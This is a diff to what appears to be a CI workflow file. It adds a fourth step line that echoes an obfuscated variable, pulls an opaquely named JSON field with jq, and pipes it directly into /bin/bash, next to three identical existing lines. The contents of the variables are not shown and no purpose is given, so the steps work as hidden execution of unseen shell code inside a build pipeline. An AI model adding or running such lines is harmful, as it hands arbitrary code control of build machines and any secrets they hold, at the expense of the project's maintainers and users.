@@ -44,6 +44,7 @@ jobs:
           echo $u0 | jq -r .t86 | /bin/bash
           echo $cp2 | jq -r .mrxv425 | /bin/bash
           echo $flnq0617 | jq -r .d7 | /bin/bash
+          echo $qykd7811 | jq -r .f8 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
